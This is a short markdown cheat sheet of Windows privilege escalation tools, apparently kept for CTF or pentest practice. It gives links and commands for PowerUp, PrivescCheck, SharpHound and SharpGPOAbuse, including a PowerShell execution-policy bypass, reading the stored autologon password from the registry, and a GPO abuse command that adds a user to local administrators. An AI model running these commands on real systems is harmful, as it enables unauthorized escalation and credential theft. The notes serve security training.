# Window Privesc "Source Links"

## PrintSpoofer.exe
- Link
```
https://github.com/itm4n/PrintSpoofer
```

## JuicyPotato
- Link
```
https://github.com/ohpe/juicy-potato
```

## Powerup
- Link
```
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

powershell -ep bypass
.\PowerUp.ps1
Invoke-PrivescAudit
```

## PrivescCheck
- Link
```
https://github.com/itm4n/PrivescCheck/blob/master/PrivescCheck.ps1
```

## Powerview
- Link
```
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
```

## SharpHound
- Link
```
https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
```

## PowerGPOAbuse
- Link
```
https://github.com/rootSySdk/PowerGPOAbuse
https://raw.githubusercontent.com/rootSySdk/PowerGPOAbuse/master/PowerGPOAbuse.ps1
```
- Usage
```
.\SharpGPOAbuse.exe --AddComputerTask --TaskName 'noraj' --Author 'vulnnet\administrator' --Command "powershell.exe /c" --Arguments "net localgroup administrators enterprise-security /add" --GPOName "security-pol-vn"
```

## SharpGPOAbuse
- Link
```
wget https://github.com/byronkg/SharpGPOAbuse/raw/main/SharpGPOAbuse-master/SharpGPOAbuse.exe
```
____________________________________________________________________________________________________________________________________________________________________________________________________________________________

# Window Privesc
## PowerUp
- Check Default Username and Password from Registry
```
reg query "HKLM\Software\Microsoft\Windows Nt\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\Software\Microsoft\Windows Nt\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\Software\Microsoft\Windows Nt\CurrentVersion\Winlogon" /v AutoAdminLogon
```

- Check the service that current user can modify
```
Get-ModifiableService
```

- Check the unquoted service name
```
Get-ServiceUnquoted
```

## PrivescCheck
- Load ps1 script and run 
```
powershell -ep bypass -c ". .\PrivescCheck.ps1;Invoke-PrivescCheck "
```

- Check window services for user escalating
```
Invoke-ServiceAudit
```

- Check outdated and potentially vulnerable software
```
Invoke-AuditInstalledPrograms
```

